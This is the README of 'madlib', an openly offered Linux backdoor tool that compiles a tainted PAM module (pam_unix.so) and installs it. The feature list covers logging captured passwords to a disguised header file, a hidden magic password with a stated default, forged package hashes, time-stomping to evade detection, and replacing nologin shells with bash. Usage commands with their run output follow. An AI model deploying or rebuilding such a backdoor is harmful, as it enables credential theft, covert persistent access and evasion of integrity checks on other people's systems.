"# madlib\n## Features: \n* Logs username/passwords to file\n* Obfuscates backdoor password with bcrypt (helps make reverse engineering more difficult and string dumps less effective)\n* Automatically updates the DPKG MD5 hashes for all moved/replaced files\n* Time stomps all moved/replaced files\n* Replaces /bin/false, and /bin/nologin with /bin/bash (effectively making any user able to ssh in)\n## Requirements:\n* Requires Python3\n* Root privileges needed\n## Default Entries:\n* Username/passwords by default are logged to /usr/include/type.h\n* The default magic password is secretpassxd\n\n\n## Usage\n\nManually Specifying PAM Version:\n\n```\nroot@homebase /h/r/madlib# ./pam.py \"1.3.0\"\n                    .___.__  ._____.\n  _____ _____     __| _/|  | |__\\_ |__\n /     \\\\__  \\   / __ | |  | |  || __ \\\n|  Y Y  \\/ __ \\_/ /_/ | |  |_|  || \\_\\ \\\n|__|_|  (____  /\\____ | |____/__||___  /\n      \\/     \\/      \\/              \\/\n    https://github.com/rek7/madlib/\n[00:15:55] [+] PAM TAR Download Completed\n[00:15:56] [+] Finishing Extracting\n[00:15:56] [+] Added Backdoor\n[00:16:16] [+] Finished Compiling Tainted Lib\n[00:16:16] [+] Finished Successfully Compiled PAM File Moved to: '/lib/x86_64-linux-gnu/security/pam_unix.so'\n```\n\nAutomatic Version Detection:\n\n```\nroot@homebase /h/r/madlib# ./pam.py\n                    .___.__  ._____.\n  _____ _____     __| _/|  | |__\\_ |__\n /     \\\\__  \\   / __ | |  | |  || __ \\\n|  Y Y  \\/ __ \\_/ /_/ | |  |_|  || \\_\\ \\\n|__|_|  (____  /\\____ | |____/__||___  /\n      \\/     \\/      \\/              \\/\n    https://github.com/rek7/madlib/\n[00:17:55] [!] Detected PAM Version: '1.3.0'\n[00:17:55] [+] PAM TAR Download Completed\n[00:17:56] [+] Finishing Extracting\n[00:17:56] [+] Added Backdoor\n[00:18:16] [+] Finished Compiling Tainted Lib\n[00:18:16] [+] Finished Successfully Compiled PAM File Moved to: '/lib/x86_64-linux-gnu/security/pam_unix.so'\n```\n"
